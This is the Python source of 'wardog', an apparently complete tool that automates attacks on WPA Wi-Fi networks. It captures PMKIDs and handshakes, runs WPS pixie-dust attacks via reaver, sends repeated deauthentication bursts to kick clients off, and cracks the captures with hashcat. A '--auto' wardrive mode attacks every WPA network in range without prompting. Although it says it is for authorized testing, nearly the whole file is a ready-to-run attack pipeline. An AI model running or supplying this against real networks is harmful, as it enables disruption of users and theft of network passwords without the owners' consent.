"""wardog: automated WPA handshake / PMKID / WPS capture pipeline for
authorized wireless security testing.

For each target: locks the channel, tries PMKID capture and WPS pixie-dust
first (fast, sometimes client-free), then falls back to finding real
connected clients and deauthing them in rounds until a valid handshake
lands. At the end, cracks everything captured against the wordlist below.

Ctrl+C, like in wifite, stops whatever is currently happening (the scan, or
the attack on the current target) and prompts for what to do next, instead
of killing the whole program.
"""
import argparse
import csv
import glob
import os
import re
import shutil
import subprocess
import sys
import time
from pathlib import Path

from . import __version__

XDG_DATA_HOME = Path(os.environ.get("XDG_DATA_HOME", Path.home() / ".local" / "share"))
XDG_CACHE_HOME = Path(os.environ.get("XDG_CACHE_HOME", Path.home() / ".cache"))

OUT_DIR = XDG_DATA_HOME / "wardog" / "captures"
SCRATCH = XDG_CACHE_HOME / "wardog"

DEFAULT_WORDLIST = "/usr/share/wordlists/rockyou.txt"
DEFAULT_RULES = "/usr/share/hashcat/rules/best66.rule"
WORDLIST = DEFAULT_WORDLIST
RULES = DEFAULT_RULES

CAP_IFACE = None     # capture/scanning interface, auto-detected at startup
DEAUTH_IFACE = None  # injection interface, auto-detected (falls back to CAP_IFACE if only one adapter)

WARDRIVE_SCAN_SECONDS = 15  # --auto only: how long to sniff per cycle before attacking what it found
DEAUTH_COUNT = 8            # frames per burst
DEAUTH_WAIT = 8             # seconds to wait after a burst before checking for a handshake
PER_TARGET_TIMEOUT = 240    # hard cap (seconds) spent on one network before moving on
PMKID_TIMEOUT = 15          # seconds to wait for a PMKID response after fake-authenticating
WPS_CHECK_SECONDS = 6       # how long to listen for a WPS beacon before giving up
WPS_PIXIE_TIMEOUT = 90      # max seconds to let reaver's pixie-dust attack run

AUTO_MODE = False

# apt package providing each required binary, for a helpful error message
# if it's missing (Kali/Debian package names).
REQUIRED_TOOLS = {
    "airodump-ng": "aircrack-ng",
    "aireplay-ng": "aircrack-ng",
    "aircrack-ng": "aircrack-ng",
    "airmon-ng": "aircrack-ng",
    "hcxpcapngtool": "hcxtools",
    "hashcat": "hashcat",
    "wash": "reaver",
    "reaver": "reaver",
    "iw": "iw",
}


# ---------------------------------------------------------------- processes

def run_root(cmd, timeout=None):
    """Foreground sudo command, output discarded."""
    try:
        subprocess.run(["sudo"] + cmd, stdin=subprocess.DEVNULL,
                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                        timeout=timeout)
    except subprocess.TimeoutExpired:
        pass


def bg_root(cmd):
    """Background sudo command, fully detached from our controlling
    terminal (own session) so it can't be hit by our Ctrl+C, and can't
    grab the terminal's tty settings (airodump-ng does this for its own
    keyboard shortcuts, which can otherwise suppress SIGINT for everyone
    sharing the terminal)."""
    return subprocess.Popen(["sudo"] + cmd, stdin=subprocess.DEVNULL,
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                             start_new_session=True)


def kill_all_airodump():
    """Kill every airodump-ng process outright, matching by name rather
    than PID: `sudo cmd` gives us sudo's PID, not the actual airodump-ng
    child's, and signalling sudo doesn't reliably forward to it.

    Polls quickly (airodump-ng normally dies within a fraction of a second
    of SIGINT) so this doesn't add a noticeable delay after Ctrl+C; only
    falls back to SIGKILL and a longer wait if it's actually stuck."""
    run_root(["pkill", "-INT", "-f", "airodump-ng"])
    deadline = time.time() + 2
    while time.time() < deadline:
        r = subprocess.run(["pgrep", "-f", "airodump-ng"],
                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        if r.returncode != 0:
            return
        time.sleep(0.1)
    run_root(["pkill", "-9", "-f", "airodump-ng"])
    time.sleep(0.3)


def latest_file(prefix, suffix_glob):
    matches = glob.glob(f"{prefix}{suffix_glob}")
    if not matches:
        return None
    return max(matches, key=os.path.getmtime)


def get_iface_mac(iface):
    try:
        return Path(f"/sys/class/net/{iface}/address").read_text().strip().upper()
    except OSError:
        return None


def has_handshake(cap_path):
    try:
        out = subprocess.run(["aircrack-ng", cap_path], capture_output=True,
                              text=True, timeout=30).stdout
    except Exception:
        return False
    return "1 handshake" in out


def eapol_progress(cap_path, bssid, client_mac):
    """Returns the set of 4-way handshake message numbers (a subset of
    {1,2,3,4}) seen so far between bssid and client_mac, by inspecting
    each EAPOL-Key frame's key info bits directly (no crypto check —
    that's what has_handshake()/aircrack-ng is for)."""
    from scapy.utils import PcapReader
    from scapy.layers.dot11 import Dot11
    from scapy.layers.eap import EAPOL

    bssid_l, client_l = bssid.lower(), client_mac.lower()
    messages = set()
    try:
        with PcapReader(cap_path) as reader:
            for pkt in reader:
                if not pkt.haslayer(EAPOL):
                    continue
                eapol = pkt[EAPOL]
                if eapol.type != 3:  # 3 == EAPOL-Key
                    continue
                dot11 = pkt.getlayer(Dot11)
                if dot11 is None:
                    continue
                addr1 = (dot11.addr1 or "").lower()
                addr2 = (dot11.addr2 or "").lower()
                if {addr1, addr2} != {bssid_l, client_l}:
                    continue

                raw = bytes(eapol.payload)
                if len(raw) < 3:
                    continue
                key_info = (raw[1] << 8) | raw[2]
                install = bool(key_info & 0x0040)
                mic = bool(key_info & 0x0100)
                secure = bool(key_info & 0x0200)
                from_ap = addr2 == bssid_l

                if from_ap and not mic:
                    messages.add(1)
                elif from_ap and mic and install:
                    messages.add(3)
                elif not from_ap and mic and secure:
                    messages.add(4)
                elif not from_ap and mic:
                    messages.add(2)
    except Exception:
        pass
    return messages


# -------------------------------------------------------------------- misc

def sanitize(name):
    return "".join(c for c in name if c.isalnum() or c in "_-")


def clear_scratch():
    for pattern in ("scan-*.csv", "scan-*.cap"):
        for f in SCRATCH.glob(pattern):
            try:
                f.unlink()
            except OSError:
                pass


def clear_screen():
    sys.stdout.write("\033[H\033[J")
    sys.stdout.flush()


def check_dependencies():
    missing = sorted({REQUIRED_TOOLS[b] for b in REQUIRED_TOOLS if shutil.which(b) is None})
    if missing:
        print("[!] Missing required tools. Install them with:")
        print(f"      sudo apt install {' '.join(missing)}")
        sys.exit(1)
    if not Path(WORDLIST).exists():
        print(f"[!] Wordlist not found: {WORDLIST}")
        print("    Cracking will fail; pass --wordlist to point at one "
              "(e.g. sudo apt install wordlists && gunzip /usr/share/wordlists/rockyou.txt.gz).")


# --------------------------------------------------------------- CSV parse

def parse_airodump_csv(csv_path):
    """Returns (aps, stations). aps: list of dicts {bssid, channel, power,
    enc, essid} (hidden/empty ESSIDs are kept, shown as "<hidden>").
    stations: list of dicts {mac, bssid}."""
    aps, stations = [], []
    section = None
    try:
        with open(csv_path, newline="", encoding="utf-8", errors="replace") as f:
            for row in csv.reader(f, skipinitialspace=True):
                if not row or all(not c.strip() for c in row):
                    continue
                if row[0] == "BSSID":
                    section = "ap"
                    continue
                if row[0] == "Station MAC":
                    section = "station"
                    continue
                if section == "ap" and len(row) > 13:
                    bssid = row[0].strip()
                    channel = row[3].strip()
                    power = row[8].strip()
                    enc = row[5].strip()
                    essid = row[13].strip()
                    if bssid and channel not in ("", "-1"):
                        aps.append({"bssid": bssid, "channel": channel, "power": power,
                                    "enc": enc, "essid": essid or "<hidden>"})
                elif section == "station" and len(row) > 5:
                    mac, ap_bssid = row[0].strip(), row[5].strip()
                    if mac:
                        stations.append({"mac": mac, "bssid": ap_bssid})
    except FileNotFoundError:
        pass
    return aps, stations


def parse_aps(csv_path):
    return parse_airodump_csv(csv_path)[0]


def parse_clients_for_bssid(csv_path, bssid):
    _, stations = parse_airodump_csv(csv_path)
    return [s["mac"] for s in stations if s["bssid"] == bssid]


# --------------------------------------------------------------- scanning

def render_scan_table(aps):
    clear_screen()
    print("[*] Scanning... press Ctrl+C when ready to pick targets.\n")
    print_ap_table(aps)
    sys.stdout.flush()


def print_ap_table(aps):
    print(f"  {'#':<4}{'PWR':<6}{'CH':<5}{'ENC':<11}{'ESSID':<31}{'BSSID'}")
    for i, ap in enumerate(aps, 1):
        pwr = ap.get("power") or "?"
        print(f"  {i:<4}{pwr:<6}{ap['channel']:<5}{ap['enc']:<11}{ap['essid'][:30]:<31}{ap['bssid']}")


def do_scan_live():
    """Interactive mode: scan until the user presses Ctrl+C, redrawing our
    own wifite-style live table from the CSV every second. airodump-ng's
    own output is kept off the terminal entirely (stdin/stdout/stderr all
    detached) so it never touches our tty."""
    scan_prefix = SCRATCH / "scan"
    try:
        kill_all_airodump()
        clear_scratch()
        bg_root(["airodump-ng", "-w", str(scan_prefix), "--output-format", "csv", CAP_IFACE])
        time.sleep(2)

        while True:
            csv_path = latest_file(scan_prefix, "-*.csv")
            render_scan_table(parse_aps(csv_path) if csv_path else [])
            time.sleep(1)
    except KeyboardInterrupt:
        pass

    kill_all_airodump()
    return latest_file(scan_prefix, "-*.csv")


def do_scan_timed(seconds):
    """--auto (wardrive) only: scan for a fixed window, no user interaction."""
    kill_all_airodump()
    clear_scratch()
    scan_prefix = SCRATCH / "scan"
    bg_root(["airodump-ng", "-w", str(scan_prefix), "--output-format", "csv", CAP_IFACE])
    time.sleep(seconds)
    kill_all_airodump()
    return latest_file(scan_prefix, "-*.csv")


# ----------------------------------------------------------------- attack

def prompt_interrupted(ssid):
    print()
    print(f"[!] Stopped attacking {ssid}.")
    try:
        choice = input("    (s)kip to next target, (r)etry, (c)rack now & exit, "
                        "(e)xit without cracking: ").strip().lower()
    except KeyboardInterrupt:
        print()
        return "exit"
    return {"r": "retry", "c": "crack", "e": "exit"}.get(choice, "skip")


def try_pmkid(ssid, bssid, prefix, hc_file):
    """Best-effort, client-free, deauth-free PMKID capture: fake-associates
    with the AP so it sends back its first EAPOL frame (which some routers
    include the PMKID in, before rejecting the fake association) while
    airodump-ng is already recording, then asks hcxpcapngtool whether a
    PMKID-type hash (WPA*01*) showed up.

    This is cheap (~15s) so it's always worth a try, but be realistic about
    it: hcxdumptool is the purpose-built tool for this and does it more
    reliably (proper WPA2 RSN association, not just open-system auth), but
    some adapters (rtl8xxxu/RTL8188EU confirmed) capture zero packets at
    all under hcxdumptool — aireplay-ng's plain --fakeauth is used instead
    for broader hardware compatibility, at the cost of often getting its
    association rejected outright by APs that require real WPA credentials
    ("Association denied (code 40)"). When that happens this simply falls
    through to the normal deauth+handshake capture below."""
    print(f"[*] Trying PMKID capture for {ssid} (fake association, no deauth needed)...")
    # --fakeauth loops forever re-authenticating every <delay> seconds; it
    # never exits on its own, so bound it with a timeout rather than
    # letting run_root() block indefinitely.
    run_root(["aireplay-ng", "--fakeauth", "1", "-a", bssid, CAP_IFACE], timeout=6)
    time.sleep(PMKID_TIMEOUT)

    cap_path = latest_file(prefix, "-*.cap")
    if not cap_path:
        return False

    hc_tmp = SCRATCH / "pmkid_check.hc22000"
    hc_tmp.unlink(missing_ok=True)
    subprocess.run(["hcxpcapngtool", "-o", str(hc_tmp), cap_path],
                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    if not hc_tmp.exists():
        return False

    lines = hc_tmp.read_text(errors="replace").splitlines()
    pmkid_lines = [l for l in lines if l.startswith("WPA*01*")]
    hc_tmp.unlink(missing_ok=True)
    if not pmkid_lines:
        return False

    hc_file.write_text("\n".join(pmkid_lines) + "\n")
    print(f"[+] PMKID captured for {ssid}! Saved {hc_file}")
    return True


def wps_enabled(bssid, channel):
    try:
        r = subprocess.run(["sudo", "wash", "-i", CAP_IFACE, "-c", channel, "-s"],
                            capture_output=True, text=True, timeout=WPS_CHECK_SECONDS)
        out = r.stdout
    except subprocess.TimeoutExpired as e:
        out = e.stdout or ""
        if isinstance(out, bytes):
            out = out.decode(errors="replace")
    return bssid.lower() in out.lower()


def try_wps_pixiedust(ssid, bssid, channel, safe_ssid, bssid_fs):
    """Best-effort WPS pixie-dust attack via reaver: if it works, we get
    the AP's actual WPA passphrase directly, skipping capture+cracking
    entirely for this target."""
    kill_all_airodump()
    print(f"[*] Checking {ssid} for WPS...")
    if not wps_enabled(bssid, channel):
        return False

    print(f"[*] WPS detected on {ssid}; trying pixie-dust attack "
          f"(up to {WPS_PIXIE_TIMEOUT}s)...")
    cmd = ["sudo", "reaver", "-i", CAP_IFACE, "-b", bssid, "-c", channel,
           "-K", "1", "-f", "-N", "-vv"]
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=WPS_PIXIE_TIMEOUT)
        out = r.stdout + r.stderr
    except subprocess.TimeoutExpired as e:
        out = (e.stdout or "") + (e.stderr or "")
        if isinstance(out, bytes):
            out = out.decode(errors="replace")

    m = re.search(r"WPA PSK:\s*'([^']*)'", out)
    if not m:
        print(f"[!] WPS pixie-dust attack did not recover a password for {ssid}.")
        return False

    password = m.group(1)
    wps_file = OUT_DIR / f"{safe_ssid}_{bssid_fs}.wps_password.txt"
    wps_file.write_text(f"SSID: {ssid}\nBSSID: {bssid}\nWPA password (via WPS pixie-dust): {password}\n")
    print(f"[+] WPS pixie-dust recovered the password for {ssid}: {password}")
    print(f"[+] Saved {wps_file}")
    return True


def capture_target(ssid, bssid, channel):
    safe_ssid = sanitize(ssid) or "hidden"
    bssid_fs = bssid.replace(":", "-")
    prefix = OUT_DIR / f"{safe_ssid}_{bssid_fs}"
    hc_file = Path(f"{prefix}.hc22000")
    wps_file = OUT_DIR / f"{safe_ssid}_{bssid_fs}.wps_password.txt"

    if hc_file.exists():
        print(f"[+] {ssid} already has a saved handshake, skipping.")
        return
    if wps_file.exists():
        print(f"[+] {ssid} already has a saved WPS password, skipping.")
        return

    print("=" * 47)
    print(f"[*] Target: {ssid} ({bssid}) channel {channel}")
    print("=" * 47)

    start_ts = time.time()
    got = False

    try:
        if try_wps_pixiedust(ssid, bssid, channel, safe_ssid, bssid_fs):
            return

        kill_all_airodump()
        bg_root(["airodump-ng", "-c", channel, "--bssid", bssid, "-w", str(prefix),
                 "--output-format", "pcap,csv", CAP_IFACE])
        time.sleep(6)  # let it settle and enumerate clients

        if try_pmkid(ssid, bssid, prefix, hc_file):
            kill_all_airodump()
            return

        while True:
            if time.time() - start_ts >= PER_TARGET_TIMEOUT:
                print(f"[!] Timed out on {ssid} after {PER_TARGET_TIMEOUT}s.")
                break

            csv_path = latest_file(prefix, "-*.csv")
            clients = parse_clients_for_bssid(csv_path, bssid) if csv_path else []
            # Exclude our own adapter: try_pmkid()'s fake-auth can leave our
            # own MAC listed as a "connected client" of the target, which
            # would otherwise have us pointlessly deauthing ourselves.
            own_macs = {get_iface_mac(CAP_IFACE), get_iface_mac(DEAUTH_IFACE)}
            clients = [c for c in clients if c.upper() not in own_macs]

            if not clients:
                print(f"[*] No clients seen yet for {ssid}, broadcasting deauth...")
                run_root(["aireplay-ng", "--deauth", str(DEAUTH_COUNT), "-a", bssid, DEAUTH_IFACE])
            else:
                for client in clients:
                    print(f"[*] Targeted deauth: {ssid} <-> {client}")
                    run_root(["aireplay-ng", "--deauth", str(DEAUTH_COUNT), "-a", bssid,
                              "-c", client, DEAUTH_IFACE])
                    time.sleep(2)

            time.sleep(DEAUTH_WAIT)

            cap_path = latest_file(prefix, "-*.cap")
            if cap_path and clients:
                for client in clients:
                    progress = eapol_progress(cap_path, bssid, client)
                    if progress:
                        msgs = " ".join(f"M{n}" for n in sorted(progress))
                        print(f"[*] EAPOL progress {ssid} <-> {client}: {msgs} ({len(progress)}/4)")

            if cap_path and has_handshake(cap_path):
                print(f"[+] Valid handshake captured for {ssid}!")
                got = True
                break
    except KeyboardInterrupt:
        if AUTO_MODE:
            raise  # wardrive mode has no prompts; let the top level handle it

        action = prompt_interrupted(ssid)
        if action == "retry":
            kill_all_airodump()
            print(f"[*] Retrying {ssid}...")
            return capture_target(ssid, bssid, channel)
        if action == "crack":
            kill_all_airodump()
            crack_all()
            sys.exit(0)
        if action == "exit":
            kill_all_airodump()
            sys.exit(0)
        print(f"[*] Skipping {ssid}.")
        kill_all_airodump()
        return

    kill_all_airodump()

    cap_path = latest_file(prefix, "-*.cap")
    if got and cap_path:
        subprocess.run(["hcxpcapngtool", "-o", str(hc_file), cap_path],
                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print(f"[+] Saved {hc_file}")
    else:
        print(f"[!] No valid handshake for {ssid} (raw capture kept: {cap_path or 'none'})")
    print()


def crack_all():
    print("=" * 47)
    print("[*] Cracking all captured .hc22000 files")
    print("=" * 47)
    hc_files = sorted(OUT_DIR.glob("*.hc22000"))
    if not hc_files:
        print("[*] Nothing to crack.")
        return
    if not Path(WORDLIST).exists():
        print(f"[!] Wordlist not found: {WORDLIST}. Skipping cracking.")
        return
    for hc in hc_files:
        print(f"[*] Cracking {hc}")
        cmd = ["hashcat", "-m", "22000", "-a", "0", str(hc), WORDLIST]
        if Path(RULES).exists():
            cmd += ["-r", RULES]
        cmd.append("--quiet")
        subprocess.run(cmd)
    print("[*] Done. Run: hashcat -m 22000 <file>.hc22000 --show   to see any cracked passwords.")


# ----------------------------------------------------------------- modes

def run_wardrive():
    print("[*] Wardrive mode: auto-capturing every network seen. Ctrl+C to stop and crack what you have.")
    attempted = set()
    try:
        while True:
            csv_path = do_scan_timed(WARDRIVE_SCAN_SECONDS)
            if not csv_path:
                continue
            for ap in parse_aps(csv_path):
                if ap["bssid"] in attempted or "WPA" not in ap["enc"]:
                    continue
                attempted.add(ap["bssid"])
                capture_target(ap["essid"], ap["bssid"], ap["channel"])
    except KeyboardInterrupt:
        print()
        print("[*] Stopping, moving to crack phase...")
        kill_all_airodump()
        crack_all()


def run_interactive():
    while True:
        csv_path = do_scan_live()
        if not csv_path:
            print("[!] No scan data captured. Check your interface/monitor mode.")
            sys.exit(1)

        aps = parse_aps(csv_path)
        if not aps:
            print("[!] No networks found. Press Ctrl+C to quit, or Enter to scan again.")
            try:
                input()
            except KeyboardInterrupt:
                print()
                sys.exit(130)
            continue
        break

    print()
    print_ap_table(aps)
    print()
    try:
        selection = input("Select target(s) (e.g. 1,3,4 or 'all'): ").strip()
    except KeyboardInterrupt:
        print()
        sys.exit(130)

    if selection == "all":
        indices = list(range(1, len(aps) + 1))
    else:
        indices = [int(p) for p in selection.split(",") if p.strip().isdigit()]

    for idx in indices:
        if 1 <= idx <= len(aps):
            ap = aps[idx - 1]
            capture_target(ap["essid"], ap["bssid"], ap["channel"])

    crack_all()


# ------------------------------------------------------------------- main

def list_wireless_interfaces():
    net = Path("/sys/class/net")
    if not net.exists():
        return []
    return sorted(p.name for p in net.iterdir()
                  if (p / "wireless").exists() or (p / "phy80211").exists())


def get_phy(iface):
    r = subprocess.run(["iw", "dev", iface, "info"], capture_output=True, text=True)
    m = re.search(r"wiphy (\d+)", r.stdout)
    return m.group(1) if m else None


def supports_monitor_mode(iface):
    phy = get_phy(iface)
    if phy is None:
        return False
    r = subprocess.run(["iw", f"phy{phy}", "info"], capture_output=True, text=True)
    return bool(re.search(r"^\s*\*\s*monitor\s*$", r.stdout, re.MULTILINE))


def get_iface_mode(iface):
    r = subprocess.run(["iw", "dev", iface, "info"], capture_output=True, text=True)
    m = re.search(r"^\s*type (\w+)", r.stdout, re.MULTILINE)
    return m.group(1) if m else None


def ensure_monitor_mode(iface):
    if get_iface_mode(iface) == "monitor":
        return
    run_root(["ip", "link", "set", iface, "down"])
    run_root(["iw", "dev", iface, "set", "type", "monitor"])
    run_root(["ip", "link", "set", iface, "up"])
    print(f"[*] Switched {iface} to monitor mode.")


def detect_interfaces():
    """Auto-detects monitor-mode-capable wireless adapters instead of
    assuming hardcoded wlan0/wlan1. Prefers an adapter already in monitor
    mode for capture; uses a second adapter for injection if one exists,
    otherwise falls back to sharing the single adapter for both."""
    global CAP_IFACE, DEAUTH_IFACE

    candidates = [i for i in list_wireless_interfaces() if supports_monitor_mode(i)]
    if not candidates:
        print("[!] No monitor-mode-capable wireless adapter found. Plug one in and retry.")
        sys.exit(1)

    already_monitor = [i for i in candidates if get_iface_mode(i) == "monitor"]
    CAP_IFACE = already_monitor[0] if already_monitor else candidates[0]
    ensure_monitor_mode(CAP_IFACE)

    others = [i for i in candidates if i != CAP_IFACE]
    if others:
        DEAUTH_IFACE = others[0]
        ensure_monitor_mode(DEAUTH_IFACE)
        print(f"[*] Using {CAP_IFACE} for capture, {DEAUTH_IFACE} for injection.")
    else:
        DEAUTH_IFACE = CAP_IFACE
        print(f"[!] Only one wireless adapter detected ({CAP_IFACE}); "
              f"using it for injection too.")


def build_parser():
    parser = argparse.ArgumentParser(
        prog="wardog",
        description="Automated WPA handshake / PMKID / WPS capture pipeline "
                     "for authorized wireless security testing.",
        epilog="While attacking a target, Ctrl+C stops that attack and asks: "
               "(s)kip to the next target, (r)etry the current target, "
               "(c)rack everything captured so far then exit, or (e)xit "
               "immediately without cracking.\n\n"
               f"Captured handshakes and cracking output are written under: {OUT_DIR}",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    parser.add_argument("--auto", action="store_true",
                         help="Wardrive mode: no prompts, continuously scans and attacks every "
                              "WPA network it sees. Only use this where you've confirmed there "
                              "are no neighboring networks you don't own. Ctrl+C stops it and "
                              "moves straight to cracking.")
    parser.add_argument("--wordlist", default=DEFAULT_WORDLIST, metavar="PATH",
                         help=f"Wordlist for cracking (default: {DEFAULT_WORDLIST})")
    parser.add_argument("--rules", default=DEFAULT_RULES, metavar="PATH",
                         help=f"hashcat rules file (default: {DEFAULT_RULES})")
    parser.add_argument("--version", action="version", version=f"wardog {__version__}")
    return parser


def main():
    global AUTO_MODE, WORDLIST, RULES

    args = build_parser().parse_args()
    AUTO_MODE = args.auto
    WORDLIST = args.wordlist
    RULES = args.rules

    check_dependencies()
    detect_interfaces()
    OUT_DIR.mkdir(parents=True, exist_ok=True)
    SCRATCH.mkdir(parents=True, exist_ok=True)
    clear_scratch()

    run_root(["airmon-ng", "check", "kill"])

    if AUTO_MODE:
        run_wardrive()
    else:
        run_interactive()


def run():
    """Console-script entry point."""
    try:
        main()
    except KeyboardInterrupt:
        print()
        print("[*] Interrupted, exiting.")
        kill_all_airodump()
        sys.exit(130)


if __name__ == "__main__":
    run()
